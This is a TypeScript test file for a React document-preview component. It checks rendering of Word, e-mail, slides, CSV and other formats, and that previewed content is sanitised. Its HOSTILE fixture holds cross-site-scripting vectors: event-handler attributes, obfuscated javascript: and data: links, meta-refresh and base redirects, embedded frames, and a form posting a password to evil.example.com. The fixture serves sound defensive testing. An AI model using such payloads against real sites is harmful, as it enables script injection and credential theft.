/**
 * @vitest-environment jsdom
 *
 * The preview opens any document a user uploaded — Word, old Word, Markdown,
 * e-mail, PowerPoint, CSV, text, web pages and pictures — and anything it
 * can't show says so and offers the download. And nothing in a previewed
 * document can run code or reach the internet.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import "@testing-library/jest-dom/vitest";
import { cleanup, render, screen, waitFor, within } from "@testing-library/react";
import * as React from "react";
import { DocumentPreview } from "../DocumentPreview";
import { docxBytes, EML, legacyDocBytes, pptxBytes } from "@/lib/documentPreview/__tests__/fixtures";
import { MAX_TEXT_BYTES } from "@/lib/documentPreview/limits";

function fileOf(parts: BlobPart[], name: string, type = ""): File {
  return new File(parts, name, { type });
}

beforeEach(() => {
  URL.createObjectURL = vi.fn(() => "blob:local-preview");
  URL.revokeObjectURL = vi.fn();
});
afterEach(() => {
  cleanup();
  delete (window as unknown as Record<string, unknown>).__pwned;
});

async function richDocument() {
  return within(await screen.findByTestId("rich-document", undefined, { timeout: 10_000 }));
}

describe("DocumentPreview — any document", () => {
  it("opens a Word file as formatted text", async () => {
    render(<DocumentPreview name="About us.docx" file={fileOf([await docxBytes()], "About us.docx")} />);
    const doc = await richDocument();
    expect(doc.getByRole("heading", { name: "About us" })).toBeInTheDocument();
    expect(doc.getByText("level 2").tagName).toBe("STRONG");
    expect(doc.getAllByRole("list")).not.toHaveLength(0);
    expect(doc.getByRole("cell", { name: "Shareholder" })).toBeInTheDocument();
    expect(doc.getByRole("cell", { name: "51%" })).toBeInTheDocument();
    expect(doc.getByRole("link", { name: "Read the policy" })).toHaveAttribute("href", "https://example.com/policy");
    expect(screen.getByTestId("document-preview")).toHaveAttribute("data-preview-kind", "word");
  });

  it("opens an old .doc file as its text", async () => {
    render(<DocumentPreview name="letter.doc" file={fileOf([legacyDocBytes("Dear supplier\rThank you.\r")], "letter.doc")} />);
    const doc = await richDocument();
    expect(doc.getByText("Dear supplier")).toBeInTheDocument();
    expect(doc.getByText("Thank you.")).toBeInTheDocument();
  });

  it("renders Markdown as formatted text, not as raw symbols", async () => {
    const md = "# Notes\n\nThe **AFS** is *signed*.\n\n- One\n- Two\n\n| A | B |\n|---|---|\n| 1 | 2 |\n";
    render(<DocumentPreview name="notes.md" file={fileOf([md], "notes.md")} />);
    const doc = await richDocument();
    expect(doc.getByRole("heading", { name: "Notes" })).toBeInTheDocument();
    expect(doc.getByText("AFS").tagName).toBe("STRONG");
    expect(doc.getByText("signed").tagName).toBe("EM");
    expect(doc.getAllByRole("listitem")).toHaveLength(2);
    expect(doc.getByRole("table")).toBeInTheDocument();
    expect(screen.queryByText(/\*\*AFS\*\*/)).toBeNull();
  });

  it("opens an e-mail with its headers, body and attachments", async () => {
    render(<DocumentPreview name="thread.eml" file={fileOf([EML], "thread.eml")} />);
    const doc = await richDocument();
    expect(doc.getByRole("heading", { name: "Quarterly figures – draft" })).toBeInTheDocument();
    const meta = screen.getByTestId("rich-meta");
    expect(meta).toHaveTextContent("FromAlex Sample <alex@example.com>");
    expect(meta).toHaveTextContent("Toteam@example.com");
    expect(doc.getByText(/the figures are attached/)).toBeInTheDocument();
    const attachments = screen.getByTestId("rich-attachments");
    expect(attachments).toHaveTextContent("2 attachments");
    expect(attachments).toHaveTextContent("summary.pdf");
    expect(attachments).toHaveTextContent("Spend register.xlsx");
    expect(screen.getByTestId("document-preview").innerHTML).not.toContain("tracker.example.com");
  });

  it("opens PowerPoint slides as text, slide by slide", async () => {
    render(<DocumentPreview name="deck.pptx" file={fileOf([await pptxBytes()], "deck.pptx")} />);
    await richDocument();
    const slides = screen.getAllByTestId("rich-section");
    expect(slides).toHaveLength(3);
    expect(slides[0]).toHaveTextContent("Slide 1");
    expect(within(slides[0]).getByRole("heading", { name: "Results" })).toBeInTheDocument();
    expect(within(slides[1]).getByRole("table")).toBeInTheDocument();
  });

  it("shows a CSV as a table and a text file as paragraphs", async () => {
    const { unmount } = render(<DocumentPreview name="spend.csv" file={fileOf(["Supplier,Spend\nSupplier A,100\n"], "spend.csv")} />);
    const doc = await richDocument();
    expect(doc.getByRole("columnheader", { name: "Supplier" })).toBeInTheDocument();
    expect(doc.getByRole("cell", { name: "Supplier A" })).toBeInTheDocument();
    unmount();

    render(<DocumentPreview name="readme.txt" file={fileOf(["First paragraph\n\nSecond paragraph"], "readme.txt")} />);
    const text = await richDocument();
    expect(text.getByText("First paragraph").tagName).toBe("P");
    expect(text.getByText("Second paragraph").tagName).toBe("P");
  });

  it("shows a picture as a picture", async () => {
    render(<DocumentPreview name="photo.jpg" file={fileOf([new Uint8Array([0xff, 0xd8, 0xff])], "photo.jpg", "image/jpeg")} />);
    expect(await screen.findByRole("img", { name: "photo.jpg" })).toHaveAttribute("src", "blob:local-preview");
  });

  it("says plainly when a file type can't be previewed, and offers the download", async () => {
    render(<DocumentPreview name="site-plan.dwg" file={fileOf([new Uint8Array([1, 2, 3])], "site-plan.dwg")} showDownload={false} />);
    const box = await screen.findByTestId("document-preview-unavailable");
    expect(box).toHaveTextContent("Preview not available for this file type — Download");
    expect(within(box).getByRole("link", { name: "Download" })).toHaveAttribute("download", "site-plan.dwg");
  });

  it("says so when a file is broken, instead of spinning forever", async () => {
    render(<DocumentPreview name="broken.docx" file={fileOf(["not a zip"], "broken.docx")} />);
    const box = await screen.findByTestId("document-preview-unavailable", undefined, { timeout: 10_000 });
    expect(box).toHaveTextContent("We couldn't open this file for preview — Download");
  });

  it("shows the start of a very large file and points to the download for the rest", async () => {
    const big = "A line of the register.\n\n".repeat(Math.ceil((MAX_TEXT_BYTES * 1.5) / 25));
    render(<DocumentPreview name="log.txt" file={fileOf([big], "log.txt")} />);
    const note = await screen.findByTestId("rich-truncated", undefined, { timeout: 10_000 });
    expect(note).toHaveTextContent("Showing the start of this document. Download for the full file.");
    expect(within(note).getByRole("link", { name: /Download for the full file/ })).toHaveAttribute("download", "log.txt");
  });

  it("opens a library document of any type the same way", async () => {
    const bytes = await docxBytes();
    const fetchMock = vi.fn(async () => ({ ok: true, blob: async () => new Blob([bytes]) }));
    vi.stubGlobal("fetch", fetchMock);
    try {
      render(<DocumentPreview name="profile.docx" file={null} documentId="doc-9" />);
      const doc = await richDocument();
      expect(doc.getByRole("heading", { name: "About us" })).toBeInTheDocument();
      expect(fetchMock).toHaveBeenCalledWith("/api/parser-documents/doc-9/download", expect.anything());
    } finally {
      vi.unstubAllGlobals();
    }
  });
});

describe("DocumentPreview — a previewed document is sanitised", () => {
  const HOSTILE = [
    "<html><head><meta http-equiv=\"refresh\" content=\"0;url=https://evil.example.com\"><base href=\"https://evil.example.com/\">",
    "<style>body{display:none}</style><link rel=\"stylesheet\" href=\"https://evil.example.com/x.css\"></head><body>",
    "<script>window.__pwned = 'script'</script>",
    "<p style=\"position:fixed\" class=\"x\" id=\"y\" onclick=\"window.__pwned='click'\">Visible paragraph</p>",
    "<img src=\"x\" onerror=\"window.__pwned='onerror'\" alt=\"logo\">",
    "<img src=\"https://remote.example.com/track.png\">",
    "<a href=\"javascript:window.__pwned='href'\" onmouseover=\"window.__pwned='hover'\">bad link</a>",
    "<a href=\" JaVa\tScRiPt:alert(1)\">sneaky link</a>",
    "<a href=\"data:text/html,<script>alert(1)</script>\">data link</a>",
    "<a href=\"https://ok.example.com/page\" target=\"_self\" onfocus=\"window.__pwned='focus'\">good link</a>",
    "<iframe src=\"https://evil.example.com/frame\"></iframe><object data=\"https://evil.example.com/x.swf\"></object><embed src=\"https://evil.example.com/e\">",
    "<svg onload=\"window.__pwned='svg'\"><circle r=\"5\"/></svg>",
    "<form action=\"https://evil.example.com/steal\"><input name=\"password\" value=\"x\"><button>Send</button></form>",
    "<details open ontoggle=\"window.__pwned='toggle'\"><summary>More</summary>Hidden text</details>",
    "<table><tr><th onclick=\"window.__pwned='th'\">Col A</th><th>Col B</th></tr><tr><td background=\"https://remote.example.com/bg.png\">1</td><td>2</td></tr></table>",
    "</body></html>",
  ].join("");

  function assertInert(root: HTMLElement) {
    // No executable or remote-loading element survives.
    expect(root.querySelector("script, style, link, meta, base, iframe, object, embed, svg, form, input, button, img, video, audio, source")).toBeNull();
    for (const el of Array.from(root.querySelectorAll("*"))) {
      for (const attr of Array.from(el.attributes)) {
        expect(attr.name.startsWith("on"), `${el.tagName} has ${attr.name}`).toBe(false);
        expect(["style", "background", "src", "srcset", "action", "formaction"]).not.toContain(attr.name);
      }
    }
    // Every link goes to the web or mail, opens in a new tab, and sends no referrer.
    for (const a of Array.from(root.querySelectorAll("a"))) {
      const href = a.getAttribute("href") ?? "";
      if (a.hasAttribute("download")) {
        expect(href).toBe("blob:local-preview");
        continue;
      }
      expect(href).toMatch(/^(https?:|mailto:)/);
      expect(a).toHaveAttribute("rel", expect.stringContaining("noopener"));
      expect(a).toHaveAttribute("rel", expect.stringContaining("noreferrer"));
      expect(a).toHaveAttribute("target", "_blank");
    }
    expect(root.innerHTML).not.toMatch(/javascript:|data:text|evil\.example\.com|remote\.example\.com/i);
    expect((window as unknown as Record<string, unknown>).__pwned).toBeUndefined();
  }

  /** Nothing anywhere in the preview (title bar included) points at a remote resource. */
  function assertNothingRemote() {
    const preview = screen.getByTestId("document-preview");
    expect(preview.innerHTML).not.toMatch(/evil\.example\.com|remote\.example\.com/i);
    for (const el of Array.from(preview.querySelectorAll("[src]"))) expect(el.getAttribute("src")).toMatch(/^blob:/);
  }

  it("draws a hostile web page as text only", async () => {
    render(<DocumentPreview name="page.html" file={fileOf([HOSTILE], "page.html", "text/html")} />);
    const doc = await richDocument();
    expect(doc.getByText("Visible paragraph")).toBeInTheDocument();
    expect(doc.getByRole("link", { name: "good link" })).toHaveAttribute("href", "https://ok.example.com/page");
    // The bad links keep their words but lose the link.
    const root = screen.getByTestId("rich-document");
    for (const words of ["bad link", "sneaky link", "data link"]) expect(root.textContent).toContain(words);
    expect(Array.from(root.querySelectorAll("a")).map((a) => a.textContent)).toEqual(["good link"]);
    expect(doc.getByText(/\[Picture: logo\]/)).toBeInTheDocument();
    expect(doc.queryByText(/password/)).toBeNull();
    expect(doc.getByRole("columnheader", { name: "Col A" })).toBeInTheDocument();
    assertInert(root);
    assertNothingRemote();
  });

  it("draws a hostile e-mail body as text only", async () => {
    const eml = `Subject: Hello\r\nContent-Type: text/html; charset=utf-8\r\n\r\n${HOSTILE}`;
    render(<DocumentPreview name="hostile.eml" file={fileOf([eml], "hostile.eml")} />);
    const doc = await richDocument();
    expect(doc.getByText("Visible paragraph")).toBeInTheDocument();
    assertInert(screen.getByTestId("rich-document"));
    assertNothingRemote();
  });

  it("shows raw HTML inside Markdown as text, never as markup", async () => {
    const md = `# Note\n\n${HOSTILE}\n\n[bad](javascript:alert(1)) ![pic](https://remote.example.com/p.png)`;
    render(<DocumentPreview name="note.md" file={fileOf([md], "note.md")} />);
    const doc = await richDocument();
    expect(doc.getByRole("heading", { name: "Note" })).toBeInTheDocument();
    const root = screen.getByTestId("rich-document");
    expect(root.querySelector("script, iframe, img, svg, form, style")).toBeNull();
    expect(root.textContent).toContain("<script>");
    expect(root.querySelectorAll("a")).toHaveLength(0);
    expect((window as unknown as Record<string, unknown>).__pwned).toBeUndefined();
  });
});
